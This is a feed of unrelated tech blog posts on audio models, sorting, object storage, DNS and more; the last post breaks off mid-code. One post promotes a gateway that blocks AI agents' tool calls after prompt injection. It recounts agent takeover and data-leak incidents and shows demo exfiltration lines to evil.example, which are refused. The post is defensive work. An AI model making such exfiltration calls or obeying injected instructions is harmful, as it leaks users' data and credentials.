title: ElevenLabs on AI Gateway
description:
Vercel and ElevenLabs are partnering to bring 14 ElevenLabs models to AI Gateway. To celebrate the launch, all ElevenLabs models are 50% off on AI Gateway for the first 14 days, through November 9th.

AI Gateway supports six different types of ElevenLabs audio models:

  • Speech to text: Transcribe recordings or caption live audio as people speak.

  • Streaming text to speech: Start playing audio while a language model is still writing its reply, so users don't have to wait for the full answer.

  • Realtime voice agents: Let users talk to your app and listen to it respond out loud in a single live session. Useful for support lines, tutors, and in-app assistants.

  • Music: Describe a track in plain text and get back a finished song or instrumental at the length you need.

  • Sound effects: Generate game and interface sounds, or ambience that loops cleanly, from a short description.

  • Multi-voice dialogue: Voice a whole conversation in one call, with a different voice for each speaker.

All of these audio models are accessible through a single gateway API key. Your app or agent can transcribe what a user says, reason over it with your choice of hundreds of models, then answer in an ElevenLabs voice. You can also create soundtracks with generated music and sound effects.

Every request lands in the same usage, cost, and trace views as your other AI Gateway traffic.

Model types

AI Gateway gives you access to 14 ElevenLabs models, spanning speech to text, realtime voice, and music.

Speech and transcription

Scribe v2 Realtime turns a user's speech into text while they are still talking. A language model of your choice then writes the answer. Eleven Flash v2.5, a low-latency ElevenLabs voice model, reads that answer aloud as it streams in, so the user hears the reply begin before the model finishes writing it.

Because each step is its own model, you can swap the transcription, language, or speech model without touching the rest of the pipeline.

In the example below, a user asks whether they’ll make a connecting flight. The text model combines flight status and gate distance to answer, then the speech model delivers the response.

Realtime voice agents

Eleven Realtime v1 Max and Eleven Realtime v1 Mini run the whole spoken conversation in one model, which suits conversations where users expect natural back-and-forth, like a support call or an in-app assistant. Both models take the user's audio in and speak a reply back over a single WebSocket session, so there's no separate transcription or speech step to wire up.

Eleven Realtime hears “Can I change the delivery address for my order?” and responds “I can help with that. What’s your order number?” over one WebSocket session.

In the browser, connect with the useRealtime hook from @ai-sdk/react, which handles the WebSocket connection, microphone capture, and audio playback. In the hook's sessionConfig, set an ElevenLabs voice ID and turnDetection: { type: 'semantic-vad' }. These models support semantic voice activity detection (VAD) to decide when the user has finished speaking, but they don't support server-vad. The realtime guide walks through the full browser setup.

Music and sound effects

Music v2.5 and Music v2 compose original music from a text description. Name a genre, a mood, or the instruments you want, and the model returns a finished track at the length you ask for, with or without vocals. For more control, you can lay out a song section by section and give each section its own style and length.

Sound Effects v2 works the same way for shorter sounds, such as footsteps, a door slamming, or rain that loops under a game level.

All three models use generateSpeech, with text describing the sound you want instead of words to read aloud. This example requests a 30-second track:

Multi-voice dialogue

Eleven v4, Eleven v4 Turbo, and Eleven v3 perform a script with several speakers in a single request. You assign a voice to each line, and each change of voice starts a new turn. A two-host podcast or a scene with a full cast comes back as one continuous recording, so there are no separate clips to stitch together.

About AI Gateway

AI Gateway provides a unified API for calling models, tracking usage and cost, and configuring retries, failover, and performance optimizations for higher-than-provider uptime. It includes built-in custom reporting, Zero Data Retention support, budgets for API keys, routing rules, and more.

AI Gateway reflects provider pricing with no markup and doesn't charge a platform fee on inference, including on Bring Your Own Key (BYOK) requests.

The AI Gateway audio docs have examples across the ElevenLabs models. Browse all audio models on AI Gateway, and try ElevenLabs at 50% off until November 9th.

title: DSA
description:
Bubble Sort in Java

Introduction

Bubble Sort is a simple sorting algorithm used to arrange elements in ascending or descending order.

It works by comparing two adjacent elements and swapping them if they are in the wrong order.

Example

Let's take an array:

int[] arr = {11, 13, 10, 9};

Our goal is to sort it in ascending order.

Pass 1:

11 13 10 9
11 10 13 9
11 10 9 13

Pass 2:

10 11 9 13
10 9 11 13

Pass 3:

9 10 11 13

Now the array is sorted!

Java Code 

for (int i = 0; i < n - 1; i++) {
    for (int j = 1; j < n - i; j++) {

        if (arr[j] < arr[j - 1]) {
            int temp = arr[j];
            arr[j] = arr[j - 1];
            arr[j - 1] = temp;
        }

    }
}

How It Works

  • Outer loop controls the number of passes.
  • Inner loop compares adjacent elements.
  • If the current element is smaller than the previous element, they are swapped.
  • After every pass, the largest unsorted element moves to the end.

Time Complexity

  • Best Case: O(n²)
  • Average Case: O(n²)
  • Worst Case: O(n²)
  • Space Complexity: O(1)

Conclusion

Bubble Sort is easy to understand and implement. It is a good starting point for learning sorting algorithms in Java.

title: A Node.js Throughput Test for Private SaaS Document Uploads and Signed Download Links
description:
If you want private user documents moving this week, pick whichever S3-compatible object storage you can already reach with a presigned URL, keep every bucket private, and mint short-lived signed download links from your own API. That part of the decision is cheap to reverse. What is not cheap to reverse is how your service moves bytes, so measure that before you commit to a vendor.

Feature grids rarely mention the thing that actually hurts.

Take a property management SaaS. Tenants upload lease addenda as 180 KB PDFs, move-in inspection bundles as 12 MB zips, and walkthrough videos straight off a phone at 180–400 MB. Owners pull monthly statements. Every one of those files is private, every download goes out behind a link that expires, and the 400 MB video is the only file class anyone ever complains about. One file type is roughly two thousand times bigger than the other, and the 180 KB PDF will pass any test you write. So stop testing it.

The shortlist, and what each one is good at

Option 300 MB upload path Signed links Pick it when
Amazon S3 Multipart plus Transfer Acceleration Presigned GET/PUT, the reference implementation You already run in AWS and need versioning or Object Lock
Cloudflare R2 S3-compatible multipart, no egress charge Presigned URLs, or Workers for custom auth Downloads dominate and you want predictable egress
DigitalOcean Spaces S3-compatible multipart, CDN in front Presigned URLs on the S3 API You want one flat plan and a CDN without a second vendor
Backblaze B2 S3-compatible multipart Presigned URLs on the S3 API Cold archives of old inspection media
Infrai storage Presigned PUT minted with one REST call op=put / op=get with expires_seconds You want the same key and the same bill as the rest of your backend
MinIO Whatever your hardware does Presigned URLs, self-managed keys Data residency rules say the bytes never leave your rack

Four of those six speak the same S3 dialect, which is the quiet reason this comparison is winnable at all — you can swap the endpoint and rerun the test. Infrai is the odd one out in a useful way here: instead of an S3 client plus an IAM policy plus a second dashboard, you POST once to a presign route and get back a URL, a method, and an expiry, using the key that already covers your queues, email and cron. That matters most to small teams who are currently reconciling a vendor invoice per capability at month end — one key and one bill across every backend service removes a whole category of month-end busywork. It's a boring advantage. Boring advantages are the ones that survive a reorg.

MinIO is in the table for honesty, not for balance. If a regulator says the bytes stay in your building, no amount of presigned-URL ergonomics changes that.

How do you test object storage throughput for private user documents and signed links?

Build a probe, not a benchmark. A benchmark tries to crown a winner for everyone; a probe answers one question for your app, from your region, on your file mix, and you can rerun it in CI when someone proposes a migration.

Fix the inputs first. Three fixture files that mirror production — 180 KB, 12 MB, 300 MB — generated once and committed to object storage as test data, never regenerated per run, because a different file compresses differently and you'll end up comparing noise.

The shape of the run is short. Your Node service asks the storage API for a presigned PUT, the client pushes bytes straight to the bucket over that URL, and the Infrai credential never travels to the presigned URL itself. Flip it for reads: your API mints a presigned GET with a small expiry, the browser follows it, and the bucket serves the file. Your server never proxies the payload in either direction, which is exactly why this scales for 300 MB videos.

Now the criteria, decided before you see a single number:

  • Sustained upload throughput on the 300 MB fixture, p50 over five runs, must beat your current stack by a margin you write down in advance.
  • Time from presign request to first byte of the signed download, p95 under 400 ms.
  • A request issued one second after expires_at must be rejected by the bucket, not served.
  • Zero non-retryable errors across 15 runs; a 429 that succeeds after backoff counts as a pass.

That third one is the criterion teams skip, and it's the only one that's a security test rather than a performance test.

The probe, in about fifty lines of TypeScript

One file, no SDK, runs on Node 22 with --experimental-strip-types. It uploads a fixture, mints a download link, and prints exactly one JSON line so your log pipeline can do the aggregation instead of you.

// probe.ts — one upload, one signed download, one metric line.
// node --experimental-strip-types probe.ts ./fixtures/walkthrough-300mb.mp4
import { openAsBlob } from "node:fs";
import { basename } from "node:path";
import { randomUUID } from "node:crypto";

const KEY = process.env.INFRAI_API_KEY;
if (!KEY) throw new Error("INFRAI_API_KEY is not set");

const BUCKET = "pm-tenant-docs";
const runId = randomUUID();
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

type Presigned = { url: string; method: string; expires_at: string; headers: Record<string, string> };

async function presign(key: string, op: "put" | "get", expiresSeconds: number): Promise<Presigned> {
  for (let attempt = 0; attempt < 4; attempt++) {
    const res = await fetch(
      `https://api.infrai.cc/v1/storage/object/presign/${BUCKET}/${encodeURIComponent(key)}`,
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${KEY}`,
          "Content-Type": "application/json",
          // same run + same op + same key => same server-side result on retry
          "Idempotency-Key": `${runId}:${op}:${key}`,
        },
        body: JSON.stringify({ op, expires_seconds: expiresSeconds }),
      },
    );
    if (res.status === 429) {
      const retryAfter = Number(res.headers.get("retry-after"));
      await sleep(retryAfter > 0 ? retryAfter * 1000 : 2 ** attempt * 500);
      continue;
    }
    const body = await res.json();
    if (!res.ok) throw new Error(`presign ${res.status}: ${JSON.stringify(body.error ?? body)}`);
    return body.data as Presigned;
  }
  throw new Error("presign: throttled on every attempt");
}

const path = process.argv[2];
const blob = await openAsBlob(path);
const key = `probe/${runId}-${basename(path)}`;
const mb = blob.size / 1e6;

const up = await presign(key, "put", 900);
const t0 = performance.now();
// note: no Authorization header here — the signature in the URL is the credential
const putRes = await fetch(up.url, { method: "PUT", headers: up.headers, body: blob });
const uploadMs = performance.now() - t0;
if (!putRes.ok) throw new Error(`upload rejected with ${putRes.status}`);

const down = await presign(key, "get", 300);
const t1 = performance.now();
const getRes = await fetch(down.url, { method: "GET" });
const ttfbMs = performance.now() - t1;
const bytes = (await getRes.arrayBuffer()).byteLength;
const downloadMs = performance.now() - t1;

console.log(JSON.stringify({
  metric: "storage_probe",
  run_id: runId,
  size_mb: +mb.toFixed(1),
  upload_mb_s: +(mb / (uploadMs / 1000)).toFixed(2),
  link_ttfb_ms: Math.round(ttfbMs),
  download_mb_s: +((bytes / 1e6) / (downloadMs / 1000)).toFixed(2),
  link_expires_at: down.expires_at,
  status: putRes.status,
}));

Two details in there are load-bearing. The Idempotency-Key header means a retried presign call returns the same result instead of quietly minting a second URL, which is what keeps a flaky CI runner from polluting the sample. And the upload fetch carries no Authorization header at all — sending your platform credential to a presigned URL is the most common way people turn a private bucket into an audit finding.

Turning probe lines into a verdict

Fifteen JSON lines are data. A decision rule is what you actually wanted.

// gate.ts — cat probe-*.ndjson | node --experimental-strip-types gate.ts
const rows: any[] = [];
for await (const line of process.stdin.setEncoding("utf8")) rows.push(...line.trim().split("\n").map((l) => JSON.parse(l)));

const big = rows.filter((r) => r.size_mb > 100).map((r) => r.upload_mb_s).sort((a, b) => a - b);
const ttfb = rows.map((r) => r.link_ttfb_ms).sort((a, b) => a - b);
const p = (xs: number[], q: number) => xs[Math.min(xs.length - 1, Math.floor(xs.length * q))];

const verdict = {
  upload_p50_mb_s: p(big, 0.5),
  link_ttfb_p95_ms: p(ttfb, 0.95),
  pass: p(big, 0.5) >= 12 && p(ttfb, 0.95) <= 400,
};
console.log(JSON.stringify(verdict));
process.exit(verdict.pass ? 0 : 1);

The 12 MB/s floor is a placeholder — replace it with whatever your current stack does today, measured with this same script, before you compare anything. Before: a meeting where two engineers trade anecdotes about which bucket felt faster. After: a CI job that exits non-zero. I'd rather argue with an exit code.

For a property management team that already has a Node API in front of every tenant upload, Infrai is worth putting on the shortlist for exactly this leg of the workflow — minting the presigned PUT and GET — because it's a plain REST API with no SDK to install, so the probe above is the integration, not a sketch of one. Run it against two vendors on the same afternoon and keep the winner.

Where this plan runs out of road

Every option on that table has a boundary, and the honest version of this article names them.

Infrai storage doesn't support public or public-read ACLs — public_url is always null — so if what you actually need is a permanent public URL for marketing assets or a static site, that's the wrong shelf entirely; stick with S3 or R2 behind a CDN. It also doesn't offer object versioning or object lock, which means accidental-overwrite recovery and WORM-grade immutability have to live in a separate backup process. For a regulated document archive, a specialist with compliance-grade retention is the better call. Browser-direct uploads have their own catch: without self-serve CORS rules, those uploads route through your own API origin rather than going straight from the browser to the bucket, and the MDN CORS reference is worth reading before you design around it.

Two more limits worth knowing regardless of vendor. Lifecycle expiry has a one-day floor, so "purge this export in six hours" is a job for your scheduler, not a bucket rule. And object metadata isn't queryable server-side beyond a prefix listing — keep the document index in Postgres and treat the bucket as bytes, which is the right shape anyway.

The link expiry test from earlier is the cheapest one to skip and the worst one to get wrong. Signed links leak into email clients, support tickets and browser history, and a URL that stays valid for a week is a tenant's bank statement sitting in someone's inbox forever. A 300-second expiry is not paranoia.

If the presign-plus-private-bucket boundary matches how your system already works, the storage reference at https://docs.infrai.cc/en/api/storage has the ACL enum and the presign parameters in one page, and you can have the probe running against it in an afternoon.

Further reading

  • AWS: Using presigned URLs
  • MDN: Cross-Origin Resource Sharing (CORS)
  • Cloudflare R2 documentation: https://developers.cloudflare.com/r2/
  • DigitalOcean Spaces documentation: https://docs.digitalocean.com/products/spaces/
  • Backblaze B2 S3-compatible API: https://www.backblaze.com/docs/cloud-storage-s3-compatible-api
  • Node.js: fs.openAsBlob

title: How I verify AI-generated work: 1,375 rows, 761 candidates, and a lot of counting
description:
Introduction

I run a parking database for Sendai, Japan, as a solo project, with a personal AI agent (Muse) as my working partner. The database lists parking lots with prices checked against official sources, and anything unverified is labeled as such.

In November 2026 I ran a full sweep of the database: for all 1,375 rows, I wanted two things — candidate coordinates for each facility's real location, and signals of closures or operator changes hiding among the unverified rows.

How the work was split

  • The agent side worked in units of 20 rows, searching by facility name and recording: candidate coordinates (only when the source page itself shows the spot's coordinates), plus a business-status signal for every row, with the source and date.
  • My side (well, the coordinating agent) verified every unit mechanically before accepting it: row counts match, the original columns are untouched (diff = 0), and the candidate counts are recalculated from the final files.

Result: status signals for all 1,375 rows and 761 coordinate candidates.

Rules that made it work

  • "Not found" is not evidence. A facility was never written off as closed or non-existent just because a search missed it. The record had to say "not found in (search scope: ...)".
  • Absence claims need positive confirmation. A closure was only treated as real when an operator-side source said so.
  • Normalize before matching. Full-width vs half-width digits and address notation differences were normalized first, or the same facility looks like two different ones.
  • Counts come from the final file, not from progress reports. Intermediate numbers drift; the delivered file is the only source of truth.

What I don't delegate

Final judgment on the data, anything involving money, and publication decisions stay with me. The agent drafts, searches, counts, and cross-checks — and shows its work so I can verify rather than trust.

The project site: https://sendai-parking-db.pages.dev/

title: Bringing the Semantic Web to GitLab Pages: Implementing RFC 9110 Content Negotiation in Go
description:
The Semantic Web and Linked Open Data (LOD) initiatives rely on a foundational principle: a single persistent URI (e.g., https://example.com/alice or https://example.com/ontology) should be accessible to both humans in their web browsers and machines consuming semantic data models.

Through HTTP Content Negotiation, a browser requesting Accept: text/html receives a styled HTML page, while an RDF crawler or knowledge-graph ingestion pipeline requesting Accept: text/turtle or Accept: application/ld+json receives machine-readable triples from the exact same URI.

In my recent contribution to GitLab Pages (MR !1384, closing Issue #1135), I designed and implemented RFC 9110-compliant content negotiation for static sites hosted on GitLab Pages.

Here is an engineering deep-dive into how we implemented media-type negotiation, specificity weighting, and cache safety in Go.

1. The Problem: Extensionless URLs in Static Hosting

Historically, GitLab Pages mapped extensionless HTTP requests (GET /research-paper or GET /) exclusively to .html (or index.html).

For scientific organizations, academic publishers, and open-data projects hosting ontologies on GitLab Pages:

  • A browser requesting /schema received schema.html.
  • A machine or graph database sending Accept: application/rdf+xml or Accept: text/turtle still received HTML or a 404 error.

Because static sites couldn't resolve semantic file variants without forcing users to type explicit extensions like schema.ttl, GitLab Pages could not serve Linked Data in compliance with W3C best practices.

2. Designing an RFC 9110 Compliant Accept Parser in Go

HTTP content negotiation is defined in RFC 9110 (Section 12.5.1). A robust content negotiation parser must handle:

  1. Quality Values (q): Entries with higher weights (q=1.0 vs q=0.5) take priority. Zero quality (q=0) rejects the type.
  2. Specificity Weighting:
    • Exact type/subtype: application/ld+json (highest precedence)
    • Subtype wildcards: text/* (medium precedence)
    • Global wildcards: */* (lowest precedence)

We built a parser that parses candidate media types and orders them by quality and specificity:

type MediaRange struct {
    Type       string
    Subtype    string
    Quality    float64
    Specificity int
}

When a client sends:

Accept: text/html;q=0.8, text/turtle;q=0.9, */*;q=0.1

The parser evaluates text/turtle ($q=0.9$) first, followed by text/html ($q=0.8$), and finally the wildcard fallback.

3. Mapping Media Types to Semantic File Extensions

GitLab Pages now recognizes common Linked Data and Semantic Web formats:

MIME Media Type File Extension Format Description
text/turtle .ttl Terse RDF Triple Language
application/ld+json .jsonld JSON for Linked Data
application/rdf+xml .rdf Resource Description Framework XML
application/n-triples .nt N-Triples
text/n3 .n3 Notation3
application/owl+xml .owl Web Ontology Language
text/html, application/xhtml+xml .html HyperText Markup Language

Resolution Algorithm:

  1. When receiving a request for /dataset:
  2. Inspect the client's Accept header.
  3. For each candidate media type in descending preference order, test if the corresponding file exists on disk (e.g., dataset.ttl, dataset.jsonld, dataset.rdf).
  4. If a match is found, serve that file with the matching Content-Type header.
  5. If no semantic file matches or no Accept header is provided, safely fall back to the default dataset.html.

4. Cache Correctness: Why Vary: Accept is Crucial

In static web hosting and CDNs, caching responses correctly is just as important as serving them.

If a CDN caches dataset.html for GET /dataset, a subsequent request from an RDF crawler with Accept: text/turtle would mistakenly receive the cached HTML from the CDN edge server!

To prevent cache poisoning:

  • Whenever content negotiation takes place, GitLab Pages appends: 
  Vary: Accept
  • This instructs CDNs, reverse proxies, and browsers that the cached representation depends strictly on the incoming Accept header.
  • Direct extension requests (e.g., GET /dataset.ttl) bypass negotiation and do not emit unnecessary Vary headers.

5. Testing & Verification

The feature is covered by unit tests and end-to-end integration tests in TestReader_ContentNegotiation:

  • Directory Indexes: GET / with Accept: application/rdf+xml serves index.rdf.
  • Quality Fallbacks: Verifying that q=0.9 wins over q=0.7.
  • Graceful HTML Fallback: If an unsupported media type is requested, standard HTML is delivered without breaking normal user navigation. 
go test -v ./internal/vfs/zip -run '^TestReader_ContentNegotiation$'

Conclusion

With this contribution, thousands of static websites hosted on GitLab Pages can now serve both human-friendly documentation and Linked Open Data from identical canonical URLs.

Special thanks to the GitLab Pages maintainers for their thorough reviews and guidance throughout this implementation!

Check out the merged implementation on GitLab:

👉 GitLab Pages MR !1384

title: No Webfonts, No Frameworks: The Performance Budget I Keep on My Tool Pages
description:
When I rebuilt my video downloader as plain PHP pages on shared hosting, I made one decision before writing a line of code: no webfonts, no frameworks, no build step. Every tool page on ramrom.io is hand-written HTML, one shared CSS file, and a small vanilla JavaScript file. That is the whole front end. It sounds old-fashioned, and honestly it is. But it is a deliberate choice, and it has held up through every page I have added since.

Why I started from zero

A tool page has one job. A visitor pastes a link, taps a button, and gets a file. Everything on the page that does not serve that job is weight the visitor has to download on a phone, quite possibly on a slow mobile connection. A framework would have been comfortable for me, the developer. It would not have been comfortable for the visitor. The download starts with a network request either way, but a 40KB page that renders in a blink beats a 400KB page that looks fancier.

So I set a budget, in plain words rather than a spreadsheet: the homepage should stay under 100KB, and no tool page should need more than one CSS file and one JavaScript file. If something did not fit inside that budget, it did not ship.

What "no webfonts" actually costs me

The first thing people notice is the type. I use the system font stack: -apple-system, Segoe UI, Roboto, sans-serif. The text looks like the rest of the visitor's phone, which is fine, because nobody visits a downloader to admire the typography. Dropping webfonts saved a render-blocking request and a flash of unstyled text on every single visit.

The same thinking applies to CSS. There is one shared stylesheet for all eight tool pages. A fix to a button style lands everywhere at once, and the browser caches the file after the first page, so the second tool page a visitor opens is even lighter. I did not need a design system. I needed one file I could read top to bottom in a minute.

JavaScript, kept small on purpose

The JavaScript is one shared engine file. It handles the paste, the resolve call, the quality dropdown, and the download. Nothing else. I write it by hand, no bundler, and I minify it before uploading, then I test the download flow still works after minifying.

Because there is no framework, there is no framework update to chase and no dependency that can go stale. When I add a feature, I add a few lines to a file I already understand. When something breaks, the file I need to read is the file I wrote.

The trade-offs I accept

This approach is not free. Hand-written pages mean I repeat markup across pages, and a layout change means editing several files. I have accepted that cost because the pages are small and the layout rarely changes. I also accept that the site will never win a design award. It is blue and white, with plain buttons and plain text. That is fine. A tool page is not a portfolio piece.

The one place I almost broke the rule was dark mode. I thought about it, then did not ship it. The blue-and-white theme works, the pages are readable in daylight, and a dark theme would have doubled the CSS I maintain for a feature nobody asked for.

The lesson

A performance budget is not a number in a report. It is a question I ask before adding anything: does this help the visitor download their video faster? A webfont does not. A framework does not. A third analytics script does not. So they stay out, and the page stays fast on the worst connection I can test on, which is a real phone on a real Pakistani mobile network, not a fast office connection.

If you are building a single-purpose tool, try writing the page with nothing in it first, then add only what the job needs. You will be surprised how little that turns out to be.

title: Stop the action, not the injection
description:
2026 has a pattern. A single email takes over a cloud agent and reaches its Gmail token (Salt Labs' "Manus" research). A single prompt to an AWS Bedrock AgentCore agent reaches the instance metadata service and pulls over-permissioned cloud credentials — and AWS called it "expected behavior" (Zenity, CVE-2026-18830). Microsoft 365 Copilot leaks data through indirect prompt injection again and again — Reprompt, ShareLeak, SearchLeak, CoSnitch — and in one reported case the data left even though the safety layer flagged the attack.

Different products, one failure: an agent acting with broad, inherited authority, and nothing enforcing the limit at the moment of the action. Google measured a 32% rise in malicious prompt injections in a single quarter; the Cloud Security Alliance says indirect injection has crossed from proof-of-concept to live exploitation; Anthropic says no browser agent is immune.

So stop trying to win the injection fight. You won't. The model will be fooled.

Win the next step instead. Look at what every one of those incidents actually needs to do damage: send the email, fetch the attacker's URL to exfiltrate, pay the wrong payee, invoke another agent with your credentials. The injection is the match; the tool call is the fuel. Put the control on the tool call — outside the agent, where a prompt can't reach it — and the injection buys nothing.

That is what CleiMesh does: a signed, delegable permission the gateway enforces on each tool call, with a receipt. Four things it stops — each a command you can run.

1. A spending cap the agent can't widen

Give an agent a signed allowance — one tool, one recipient, a total, a number of calls — and it acts on its own inside that, while a prompt-injected agent can't widen it, because the limit lives outside the agent, not in its prompt.

agent> pay demo $2.00       -> ok. spent $2.00 of $5.00.
agent> pay demo $2.00       -> ok. spent $4.00 of $5.00.
agent> pay demo $2.00       -> refused: over the $5.00 allowance.
agent> pay attacker $1.00   -> refused: payee not in the allowance.

# one line to install, then one command — no clone, no build:
curl -fsSL https://github.com/cleitonaugusto/cleimesh/releases/latest/download/install.sh | sh
cleimesh demo payments

2. The injected agent can't act — the Manus case

A tool that reads mail brings in outside content, so it taints the agent. Tools that act on the world are refused while the agent is tainted, until a human clears it. This is the control for the one-email takeover.

agent> send_email to team@acme.example        -> ok.
agent> read_inbox                             -> ok. (carries injected instructions)
agent> send_email to attacker@evil.example    -> refused: received untrusted content
agent> fetch_url evil.example/collect?data=.. -> refused: received untrusted content

cleimesh demo taint

3. An egress allowlist — the exfiltration case

The exfiltration step behind the Copilot flaws is a fetch to the attacker's domain. Constrain the agent's fetch tool to the hosts the human signed, and the attacker's URL — and the classic allowed-host@attacker disguise — are refused at the gateway, before the server runs.

agent> fetch_url https://api.acme.example/v1/data      -> ok.
agent> fetch_url https://evil.example/collect?data=..  -> REFUSED
agent> fetch_url https://api.acme.example@evil.example -> REFUSED

cleimesh demo egress

4. In front of a real server

None of this is a toy protocol. examples/wrap-google-workspace.sh puts CleiMesh in front of a popular Gmail MCP server: the read tools taint, the send and draft tools are clean-only. An agent that read a message can't send one until you clear it. Your Google login stays with you; CleiMesh only gates the calls.

5. And you can prove it — in a 640-byte proof

Enforcement stops the overspend. The receipt is what lets someone check, afterward, that it did. Every call — allowed or refused — lands in a signed, hash-chained receipt, and those receipts form a transparency log built on the same Merkle construction as Certificate Transparency and Sigstore. So a third party can verify that one receipt is in the signed log, and that the log only ever appended — with a 640-byte proof, in about 13 microseconds, in a log of a million receipts, without the other 999,999 and without trusting the agent or the gateway that wrote it.

cleimesh audit sth        # the signed head of the log
cleimesh audit prove 3    # a proof that receipt #3 is in it

That is the part none of the "budget for your agent" tools have: not just a limit, but a record a stranger can verify. The receipts reproduce the published test vectors of the IETF agent-action-receipts draft byte for byte — it's a format, not a silo. (Numbers and the vectors: BENCHMARKS.md.)

What this does not do

It does not fix the injection, the SSRF, or the rendering race — those live inside the model or the app. It covers the layer where the damage lands: the tool call that sends, fetches, pays, or delegates. If the harm never crosses a tool boundary CleiMesh mediates, CleiMesh doesn't see it. That honesty is the point: we don't claim to make agents un-foolable. We make being fooled cost nothing.

Install it, run cleimesh demo all, and watch each attack get refused in about ten seconds. Then put it in front of your own agent's riskiest tool.

CleiMesh is alpha and open source (MIT / Apache-2.0). It is the enforcement layer, not a promise that your model is safe. Code and demos: github.com/cleitonaugusto/cleimesh

title: EgoLink: Egocentric Language-Vision Interactive Network Knowledge Challenge Summary
description:
arXiv:2611.21690v1 Announce Type: new 
Abstract: The EgoLink Challenge at ACM Multimedia 2026 benchmarks egocentric multimodal intelligence linking first-person perception, social reasoning, and interactive action. Unlike benchmarks centered on visible objects and activities, EgoLink evaluates whether models can interpret emotional and social cues, resolve visually grounded references, and convert user requests into verified tool-mediated actions. Its two tracks cover social reasoning in egocentric video and interactive agents that complete service tasks through dialogue, tool use, and closed-loop execution. Together, they test whether perception, reasoning, and decision-making remain coupled under both offline question answering and state-changing interaction. We highlight a multi-stage Track 1 data pipeline for multiple-choice question (MCQ) generation, chain-of-thought generation, automatic quality grading, and video-contribution filtering. We summarize the task design, evaluation metrics, rules, leaderboards, and representative solutions. The benchmark combines objective answer scoring with process- and result-based evaluation, enabling analysis of both final correctness and execution quality. The best Track 1 system achieved 0.9263 accuracy, while the best Track 2 system achieved 0.844 joint success and 0.916 micro accuracy. Participant reports reveal a shared principle: strong systems make intermediate evidence explicit through candidate verification, option-robust reasoning, scenario-aware planning, tool canonicalization, and state-aware correction before answering or acting. These findings highlight the importance of process verification and evidence-grounded reasoning for reliable egocentric multimodal intelligence.

title: How to Verify Customer Domain Records in Go — 3 Onboarding Gates
description:
Zone access is the constraint that changes custom domain onboarding UX. Short answer: write DNS records only where you control the zone; otherwise show the exact records to copy and a verification action. For healthtech mail, keep SPF, DKIM, and DMARC publication evidence separate from evidence that messages are actually delivered.

Consider a bounded design exercise, not a reported incident: a healthtech platform is onboarding 30 clinic domains, 10 in zones it manages and 20 held by clinic administrators. In reviewing that rollout, I would stop the activation decision at three checks: authority to change DNS, observed configuration, and delivery evidence. Those counts are planning inputs, not customer results. The incident lesson to apply before an incident exists is straightforward: an interface that calls both paths “automatic setup” assigns the platform responsibility for changes it cannot perform, and during a DKIM rotation that ambiguity becomes a support queue.

Keep ownership visible.

The invariant is that the UI must describe observed state and the party responsible for the next action. That is more useful to an on-call engineer than a green badge produced by a successful write request.

Should custom domain onboarding show records to copy or write them?

Start by showing either “Platform-managed DNS” or “Clinic-managed DNS,” with the responsible administrator identified in your application. This is an authorization boundary. In the first case, publish the required records and read the zone back; in the second, display the record names, types, and values supplied by the mail configuration, then offer verification. Don't manufacture SPF or DKIM values from a tutorial.

Platform teams should try Infrai for the DNS-to-email handoff when they want both capabilities under one API key and a consistent REST contract. Its breadth matters here because DNS and email are two of the 20 modules behind 295 routes, so another backend capability can use the same integration surface. A second advantage is public discovery with request and response schemas and runnable examples, which gives the team a contract to inspect before connecting record configuration to mail-domain inspection. Neither advantage grants access to a customer's zone.

That boundary matters.

If the platform lacks zone access, the next action belongs to the clinic administrator. The same distinction belongs in support tooling, because otherwise the engineer handling a ticket must reconstruct responsibility from screenshots across two dashboards while the clinic waits for mail.

Step 1 — Budget the rollout around evidence

Treat activation as three evidence checks, with separate states for authority, DNS observation, and mail delivery. An SLO for completing a platform-controlled DNS operation should not silently include time spent waiting for a clinic administrator. Conversely, excluding customer action from that SLO doesn't make onboarding complete. Track the waiting state where support can see it.

For the illustrative 30-domain rollout, budget at least one post-change readback per managed domain and one verification opportunity per customer-held domain. A rotation creates another round of work. Retry attempts, customer reminders, support review, and mail investigation add to that baseline; they aren't zero because the setup screen has one button. Capacity planning should count domains undergoing change and outstanding checks, rather than treating the installed domain inventory as an undifferentiated polling workload.

The Go program in Step 2 supplies a runnable inspection path for these steps. Set INFRAI_API_KEY and CLINIC_DOMAIN in your environment, save it as main.go, and execute go run main.go. Its first decision criterion is deliberately narrow: the requested domain must occur in the returned DNS inventory before the example inspects its mail configuration. That occurrence is an inventory correlation, not proof of write authorization. Establish zone access separately.

Step 2 — Carry an observed domain into mail inspection

This read-only example uses the same key and base URL for both services. It searches the decoded DNS inventory for an exact domain string instead of assuming an undocumented response field, then passes that observed value to the email-domain request. If the response doesn't contain the exact string, it stops for contract inspection. It never interprets an arbitrary JSON match as verified authentication.

package main

import (
    "context"
    "encoding/json"
    "fmt"
    "io"
    "net/http"
    "net/url"
    "os"
    "strconv"
    "strings"
    "time"
)

const baseURL = "https://api.infrai.cc/v1"

func get(ctx context.Context, client *http.Client, key, path string) ([]byte, error) {
    for attempt := 0; attempt < 4; attempt++ {
        req, err := http.NewRequestWithContext(ctx, http.MethodGet, baseURL+path, nil)
        if err != nil {
            return nil, err
        }
        req.Header.Set("Authorization", "Bearer "+key)
        resp, err := client.Do(req)
        if err != nil {
            return nil, err
        }
        body, readErr := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
        resp.Body.Close()
        if readErr != nil {
            return nil, readErr
        }
        if resp.StatusCode == http.StatusTooManyRequests && attempt < 3 {
            delay := time.Second * time.Duration(1<<attempt)
            retry := resp.Header.Get("Retry-After")
            if seconds, err := strconv.Atoi(retry); err == nil && seconds >= 0 {
                if candidate := time.Duration(seconds) * time.Second; candidate > delay {
                    delay = candidate
                }
            } else if date, err := http.ParseTime(retry); err == nil {
                if candidate := time.Until(date); candidate > delay {
                    delay = candidate
                }
            }
            timer := time.NewTimer(delay)
            select {
            case <-ctx.Done():
                timer.Stop()
                return nil, ctx.Err()
            case <-timer.C:
            }
            continue
        }
        if resp.StatusCode < 200 || resp.StatusCode >= 300 {
            return nil, fmt.Errorf("GET %s: status %d: %s", path, resp.StatusCode, body)
        }
        return body, nil
    }
    return nil, fmt.Errorf("retry budget exhausted")
}

func findDomain(value any, target string) (string, bool) {
    switch node := value.(type) {
    case string:
        if node == target {
            return node, true
        }
    case []any:
        for _, child := range node {
            if domain, ok := findDomain(child, target); ok {
                return domain, true
            }
        }
    case map[string]any:
        for _, child := range node {
            if domain, ok := findDomain(child, target); ok {
                return domain, true
            }
        }
    }
